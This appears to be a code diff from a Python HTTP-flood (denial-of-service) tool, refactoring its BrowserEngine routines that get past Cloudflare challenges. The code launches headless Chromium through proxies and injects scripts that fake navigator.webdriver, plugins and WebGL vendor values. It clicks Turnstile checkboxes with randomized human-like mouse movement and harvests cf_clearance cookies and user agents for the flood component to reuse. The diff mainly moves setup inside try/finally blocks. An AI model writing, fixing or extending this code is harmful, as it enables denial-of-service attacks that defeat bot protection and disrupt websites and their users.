@@ -1890,14 +1890,14 @@ class BrowserEngine:
                 from patchright.sync_api import sync_playwright
                 with sync_playwright() as p:
                     browser = p.chromium.launch(headless=True)
-                    context_kwargs = {"user_agent": user_agent} if user_agent else {}
-                    if proxy:
-                        p_url = f"http://{proxy}" if "://" not in proxy else proxy
-                        context_kwargs["proxy"] = {"server": p_url}
-                    
-                    context = browser.new_context(**context_kwargs)
-                    page = context.new_page()
                     try:
+                        context_kwargs = {"user_agent": user_agent} if user_agent else {}
+                        if proxy:
+                            p_url = f"http://{proxy}" if "://" not in proxy else proxy
+                            context_kwargs["proxy"] = {"server": p_url}
+                        
+                        context = browser.new_context(**context_kwargs)
+                        page = context.new_page()
                         page.goto(url, timeout=timeout * 1000)
                         from time import sleep
                         import random
@@ -1906,7 +1906,11 @@ class BrowserEngine:
                             cookies = context.cookies()
                             cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                             if "cf_clearance" in cookie_str:
-                                return cookie_str, user_agent
+                                try:
+                                    actual_ua = page.evaluate("navigator.userAgent")
+                                except Exception:
+                                    actual_ua = user_agent
+                                return cookie_str, actual_ua
                                 
                             # Attempt Turnstile checkbox interaction if present
                             try:
@@ -1923,7 +1927,8 @@ class BrowserEngine:
                                 except: pass
                         BypassDebugger.capture_failure("Tier 3 (Patchright)", url, page_obj=page, error_msg="Challenge not solved")
                     except Exception as e:
-                        BypassDebugger.capture_failure("Tier 3 (Patchright)", url, page_obj=page, error_msg=str(e))
+                        page_obj = page if 'page' in locals() else None
+                        BypassDebugger.capture_failure("Tier 3 (Patchright)", url, page_obj=page_obj, error_msg=str(e))
                     finally:
                         browser.close()
             except Exception as e:
@@ -2560,72 +2565,74 @@ class BrowserEngine:
                         launch_args["proxy"] = {"server": px_url}
                     
                     browser = p.chromium.launch(**launch_args)
-                    context = browser.new_context(
-                        viewport={'width': 1920 + randint(-10, 10), 'height': 1080 + randint(-10, 10)},
-                        user_agent=user_agent or ML_ENGINE.get_fingerprint()["ua"],
-                    )
-                    page = context.new_page()
-                    
                     try:
-                        page.goto(url, wait_until="domcontentloaded", timeout=15000)
-                    except Exception as nav_e:
-                        if "timeout" not in str(nav_e).lower():
-                            return "proxy_error", None
-                        pass
-                    
-                    sleep(2)
-                    page.mouse.move(randint(100, 800), randint(100, 600), steps=10)
-                    sleep(0.5)
-                    
-                    # Turnstile interaction
-                    for attempt in range(12):
-                        for frame in page.frames:
-                            try:
-                                f_url = frame.url.lower()
-                                if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
-                                    box = frame.frame_element().bounding_box()
-                                    if box:
-                                        tx = box['x'] + (box['width'] * (0.1 + random.random() * 0.2))
-                                        ty = box['y'] + (box['height'] * (0.3 + random.random() * 0.4))
-                                        page.mouse.move(tx, ty, steps=randint(8, 15))
-                                        sleep(0.3 + random.random() * 0.3)
-                                        page.mouse.click(tx, ty)
-                                        page.wait_for_timeout(3000)
-                                        break
-                            except Exception:
-                                continue
+                        context = browser.new_context(
+                            viewport={'width': 1920 + randint(-10, 10), 'height': 1080 + randint(-10, 10)},
+                            user_agent=user_agent or ML_ENGINE.get_fingerprint()["ua"],
+                        )
+                        page = context.new_page()
                         
-                        # Check if solved
+                        try:
+                            page.goto(url, wait_until="domcontentloaded", timeout=15000)
+                        except Exception as nav_e:
+                            if "timeout" not in str(nav_e).lower():
+                                return "proxy_error", None
+                            pass
+                        
+                        sleep(2)
+                        page.mouse.move(randint(100, 800), randint(100, 600), steps=10)
+                        sleep(0.5)
+                        
+                        # Turnstile interaction
+                        for attempt in range(12):
+                            for frame in page.frames:
+                                try:
+                                    f_url = frame.url.lower()
+                                    if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
+                                        box = frame.frame_element().bounding_box()
+                                        if box:
+                                            tx = box['x'] + (box['width'] * (0.1 + random.random() * 0.2))
+                                            ty = box['y'] + (box['height'] * (0.3 + random.random() * 0.4))
+                                            page.mouse.move(tx, ty, steps=randint(8, 15))
+                                            sleep(0.3 + random.random() * 0.3)
+                                            page.mouse.click(tx, ty)
+                                            page.wait_for_timeout(3000)
+                                            break
+                                except Exception:
+                                    continue
+                            
+                            # Check if solved
+                            try:
+                                cookies_list = context.cookies()
+                                if any(c['name'] == 'cf_clearance' for c in cookies_list):
+                                    break
+                                title = page.title().lower()
+                                if "just a moment" not in title and title:
+                                    break
+                            except Exception:
+                                break
+                            sleep(1.5)
+                        
+                        # Harvest cookies
                         try:
                             cookies_list = context.cookies()
-                            if any(c['name'] == 'cf_clearance' for c in cookies_list):
-                                break
-                            title = page.title().lower()
-                            if "just a moment" not in title and title:
-                                break
+                            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
+                            ua = page.evaluate("navigator.userAgent")
                         except Exception:
-                            break
-                        sleep(1.5)
-                    
-                    # Harvest cookies
-                    try:
-                        cookies_list = context.cookies()
-                        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
-                        ua = page.evaluate("navigator.userAgent")
-                    except Exception:
-                        cookie_str = ""
-                        ua = user_agent
-                    try:
-                        browser.close()
-                    except: pass
-                    
-                    t2c_elapsed = round(time() - t2c_start, 2)
-                    if "cf_clearance" in cookie_str:
-                        HttpFlood._active_solver = "Patchright"
-                        logger.info(f"{bcolors.OKGREEN}[*] Tier 2c: Patchright SUCCESS in {t2c_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
-                        return cookie_str, ua
-                    else:
-                        logger.warning(f"{bcolors.WARNING}[!] Tier 2c: Patchright failed after {t2c_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
+                            cookie_str = ""
+                            ua = user_agent
+                        
+                        t2c_elapsed = round(time() - t2c_start, 2)
+                        if "cf_clearance" in cookie_str:
+                            HttpFlood._active_solver = "Patchright"
+                            logger.info(f"{bcolors.OKGREEN}[*] Tier 2c: Patchright SUCCESS in {t2c_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
+                            return cookie_str, ua
+                        else:
+                            logger.warning(f"{bcolors.WARNING}[!] Tier 2c: Patchright failed after {t2c_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
+                    finally:
+                        try:
+                            browser.close()
+                        except: pass
             except Exception as e:
                 t2c_elapsed = round(time() - t2c_start, 2)
                 logger.error(f"{bcolors.FAIL}[!] Tier 2c: Patchright FAILED in {t2c_elapsed}s: {type(e).__name__}: {e}{bcolors.RESET}")
@@ -2784,162 +2791,164 @@ class BrowserEngine:
                     launch_args["proxy"] = {"server": proxy_url}
                     
                 browser = p.chromium.launch(**launch_args)
-                context = browser.new_context(
-                    viewport={'width': 1920 + randint(-10, 10), 'height': 1080 + randint(-10, 10)},
-                    user_agent=user_agent,
-                    device_scale_factor=1,
-                    has_touch=True,
-                )
-                
-                page = context.new_page()
-                if STEALTH_INSTALLED:
-                    try:
-                        Stealth().apply_stealth_sync(page)
-                    except: pass
-                
-                page.add_init_script("""
-                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-                    window.chrome = { runtime: {} };
-                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
-                    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
-                    Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
-                    Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
-                    
-                    const getParameter = WebGLRenderingContext.prototype.getParameter;
-                    WebGLRenderingContext.prototype.getParameter = function(parameter) {
-                        if (parameter === 37445) return 'Intel Inc.';
-                        if (parameter === 37446) return 'Intel(R) Iris(TM) Plus Graphics 640';
-                        return getParameter.apply(this, arguments);
-                    };
-                """)
-                
-                logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Navigating and solving challenges...{bcolors.RESET}")
-                
                 try:
-                    page.goto(url, wait_until="domcontentloaded", timeout=15000)
-                except Exception:
-                    pass
-                
-                try:
-                    sleep(2)
-                    # Human-like scrolling jitter
-                    page.mouse.wheel(0, randint(200, 500))
-                    sleep(0.5)
-                    page.mouse.wheel(0, -randint(200, 500))
+                    context = browser.new_context(
+                        viewport={'width': 1920 + randint(-10, 10), 'height': 1080 + randint(-10, 10)},
+                        user_agent=user_agent,
+                        device_scale_factor=1,
+                        has_touch=True,
+                    )
                     
-                    solved = False
-                    for attempt in range(15):
-                        page.wait_for_timeout(1000)
+                    page = context.new_page()
+                    if STEALTH_INSTALLED:
+                        try:
+                            Stealth().apply_stealth_sync(page)
+                        except: pass
+                    
+                    page.add_init_script("""
+                        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                        window.chrome = { runtime: {} };
+                        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+                        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+                        Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
+                        Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
                         
-                        # Check frame URLs (Most reliable for Cloudflare Turnstile)
-                        for frame in page.frames:
-                            try:
-                                f_url = frame.url.lower()
-                                if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
-                                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget found in frame. Interaction pulse {attempt+1}...{bcolors.RESET}")
-                                    box = frame.frame_element().bounding_box()
-                                    if box:
-                                        target_x = box['x'] + (box['width'] * 0.15)
-                                        target_y = box['y'] + (box['height'] * 0.5)
-                                        page.mouse.move(target_x, target_y, steps=10)
-                                        sleep(0.5)
-                                        page.mouse.click(target_x, target_y)
-                                        logger.debug(f"[*] Headless Recon: Pulse click at {target_x}, {target_y}")
-                                        solved = True
-                                        break
-                            except: continue
+                        const getParameter = WebGLRenderingContext.prototype.getParameter;
+                        WebGLRenderingContext.prototype.getParameter = function(parameter) {
+                            if (parameter === 37445) return 'Intel Inc.';
+                            if (parameter === 37446) return 'Intel(R) Iris(TM) Plus Graphics 640';
+                            return getParameter.apply(this, arguments);
+                        };
+                    """)
+                    
+                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Navigating and solving challenges...{bcolors.RESET}")
+                    
+                    try:
+                        page.goto(url, wait_until="domcontentloaded", timeout=15000)
+                    except Exception:
+                        pass
+                    
+                    try:
+                        sleep(2)
+                        # Human-like scrolling jitter
+                        page.mouse.wheel(0, randint(200, 500))
+                        sleep(0.5)
+                        page.mouse.wheel(0, -randint(200, 500))
+                        
+                        solved = False
+                        for attempt in range(15):
+                            page.wait_for_timeout(1000)
                             
-                        # Fallback: CSS Selectors without timeout blocking
-                        if not solved:
-                            selectors = ["input[type='checkbox']", "#challenge-stage", "div.ctp-checkbox-container", ".check", "[role='checkbox']", "#cf-stage"]
-                            for selector in selectors:
+                            # Check frame URLs (Most reliable for Cloudflare Turnstile)
+                            for frame in page.frames:
                                 try:
-                                    if page.locator(selector).count() > 0 and page.locator(selector).is_visible():
-                                        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget detected on main page. Pulse {attempt+1}...{bcolors.RESET}")
-                                        page.locator(selector).click(timeout=2000, delay=100)
-                                        solved = True
-                                        break
-                                except: pass
+                                    f_url = frame.url.lower()
+                                    if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
+                                        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget found in frame. Interaction pulse {attempt+1}...{bcolors.RESET}")
+                                        box = frame.frame_element().bounding_box()
+                                        if box:
+                                            target_x = box['x'] + (box['width'] * 0.15)
+                                            target_y = box['y'] + (box['height'] * 0.5)
+                                            page.mouse.move(target_x, target_y, steps=10)
+                                            sleep(0.5)
+                                            page.mouse.click(target_x, target_y)
+                                            logger.debug(f"[*] Headless Recon: Pulse click at {target_x}, {target_y}")
+                                            solved = True
+                                            break
+                                except: continue
                                 
-                        if solved: 
-                            page.wait_for_timeout(3000)
-                            try:
-                                if "just a moment" not in page.title().lower():
-                                    break
-                            except Exception as e:
-                                if "Execution context was destroyed" in str(e):
-                                    logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected. Challenge likely bypassed.{bcolors.RESET}")
-                                    break
-                            solved = False
-                        
-                        # Background JS Challenges require simple mouse movement without clicks
-                        page.mouse.move(randint(100, 900), randint(100, 900), steps=5)
-                        sleep(1.0)
-                except Exception as e:
-                    if "Execution context was destroyed" in str(e):
-                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected during interaction.{bcolors.RESET}")
-                    else:
-                        logger.debug(f"[*] Headless Recon: Interaction Error: {e}\n{traceback.format_exc()}")
-
-                logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Waiting for bypass validation...{bcolors.RESET}")
-                for i in range(40):
-                    try:
-                        cookies_list = context.cookies()
-                        if any(c['name'] == 'cf_clearance' for c in cookies_list):
-                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cloudflare Clearance Obtained!{bcolors.RESET}")
-                            break
-                    except Exception as e:
-                        logger.debug(f"[*] Headless Recon: Failed to get cookies during validation: {e}")
-                        break
-                    
-                    try: 
-                        title = page.title().lower()
-                        content = page.content().lower()
-                        is_challenge = any(k in title or k in content for k in ["just a moment", "checking your browser", "enable javascript", "access denied", "attention required"])
-                        if not is_challenge and title != "" and len(content) > 2000:
-                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Barrier Breached (Fidelity: HIGH). Page Title: {page.title()}{bcolors.RESET}")
-                            break
+                            # Fallback: CSS Selectors without timeout blocking
+                            if not solved:
+                                selectors = ["input[type='checkbox']", "#challenge-stage", "div.ctp-checkbox-container", ".check", "[role='checkbox']", "#cf-stage"]
+                                for selector in selectors:
+                                    try:
+                                        if page.locator(selector).count() > 0 and page.locator(selector).is_visible():
+                                            logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget detected on main page. Pulse {attempt+1}...{bcolors.RESET}")
+                                            page.locator(selector).click(timeout=2000, delay=100)
+                                            solved = True
+                                            break
+                                    except: pass
+                                    
+                            if solved: 
+                                page.wait_for_timeout(3000)
+                                try:
+                                    if "just a moment" not in page.title().lower():
+                                        break
+                                except Exception as e:
+                                    if "Execution context was destroyed" in str(e):
+                                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected. Challenge likely bypassed.{bcolors.RESET}")
+                                        break
+                                solved = False
+                            
+                            # Background JS Challenges require simple mouse movement without clicks
+                            page.mouse.move(randint(100, 900), randint(100, 900), steps=5)
+                            sleep(1.0)
                     except Exception as e:
                         if "Execution context was destroyed" in str(e):
-                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Context destroyed (Navigated). Extracting cookies...{bcolors.RESET}")
+                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected during interaction.{bcolors.RESET}")
+                        else:
+                            logger.debug(f"[*] Headless Recon: Interaction Error: {e}\n{traceback.format_exc()}")
+     
+                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Waiting for bypass validation...{bcolors.RESET}")
+                    for i in range(40):
+                        try:
+                            cookies_list = context.cookies()
+                            if any(c['name'] == 'cf_clearance' for c in cookies_list):
+                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cloudflare Clearance Obtained!{bcolors.RESET}")
+                                break
+                        except Exception as e:
+                            logger.debug(f"[*] Headless Recon: Failed to get cookies during validation: {e}")
                             break
-                        else:
-                            logger.debug(f"[*] Headless Recon: Validation loop error: {e}")
-                    sleep(1.5)
-                
-                final_title = ""
-                try: 
-                    final_title = page.title()
-                    final_title = str(final_title).encode('ascii', 'ignore').decode('ascii')
-                except: pass
-                
-                try:
-                    cookies_list = context.cookies()
-                    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
-                    ua = page.evaluate("navigator.userAgent")
-                    logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished. Page Title: {final_title} | Cookies length: {len(cookies_list)}{bcolors.RESET}")
-                except Exception as e:
-                    logger.debug(f"[*] Headless Recon: Failed to extract final cookies/ua: {e}")
-                    cookie_str = ""
-                    ua = user_agent
-                    logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished with exception. Page Title: {final_title}{bcolors.RESET}")
-                
-                if "cf_clearance" not in cookie_str:
-                    logger.warning(f"{bcolors.WARNING}[!] Headless Recon: Failed to obtain cf_clearance in Playwright fallback.{bcolors.RESET}")
+                        
+                        try: 
+                            title = page.title().lower()
+                            content = page.content().lower()
+                            is_challenge = any(k in title or k in content for k in ["just a moment", "checking your browser", "enable javascript", "access denied", "attention required"])
+                            if not is_challenge and title != "" and len(content) > 2000:
+                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Barrier Breached (Fidelity: HIGH). Page Title: {page.title()}{bcolors.RESET}")
+                                break
+                        except Exception as e:
+                            if "Execution context was destroyed" in str(e):
+                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Context destroyed (Navigated). Extracting cookies...{bcolors.RESET}")
+                                break
+                            else:
+                                logger.debug(f"[*] Headless Recon: Validation loop error: {e}")
+                        sleep(1.5)
+                    
+                    final_title = ""
+                    try: 
+                        final_title = page.title()
+                        final_title = str(final_title).encode('ascii', 'ignore').decode('ascii')
+                    except: pass
+                    
                     try:
-                        if not is_challenge and title != "" and len(content) > 2000:
-                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: UAM appears to be disabled. Returning dummy clearance.{bcolors.RESET}")
-                            cookie_str = "cf_clearance=uam_disabled"
-                        else:
-                            browser.close()
+                        cookies_list = context.cookies()
+                        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
+                        ua = page.evaluate("navigator.userAgent")
+                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished. Page Title: {final_title} | Cookies length: {len(cookies_list)}{bcolors.RESET}")
+                    except Exception as e:
+                        logger.debug(f"[*] Headless Recon: Failed to extract final cookies/ua: {e}")
+                        cookie_str = ""
+                        ua = user_agent
+                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished with exception. Page Title: {final_title}{bcolors.RESET}")
+                    
+                    if "cf_clearance" not in cookie_str:
+                        logger.warning(f"{bcolors.WARNING}[!] Headless Recon: Failed to obtain cf_clearance in Playwright fallback.{bcolors.RESET}")
+                        try:
+                            if not is_challenge and title != "" and len(content) > 2000:
+                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: UAM appears to be disabled. Returning dummy clearance.{bcolors.RESET}")
+                                cookie_str = "cf_clearance=uam_disabled"
+                            else:
+                                return None, None
+                        except Exception:
                             return None, None
-                    except Exception:
+                    
+                    HttpFlood._active_solver = "Playwright"
+                    return cookie_str, ua
+                finally:
+                    try:
                         browser.close()
-                        return None, None
-                
-                browser.close()
-                HttpFlood._active_solver = "Playwright"
-                return cookie_str, ua
+                    except: pass
                 
         except Exception as e:
             logger.error(f"{bcolors.FAIL}[!] Headless Recon Playwright Fallback Failed: {e}\n{traceback.format_exc()}{bcolors.RESET}")
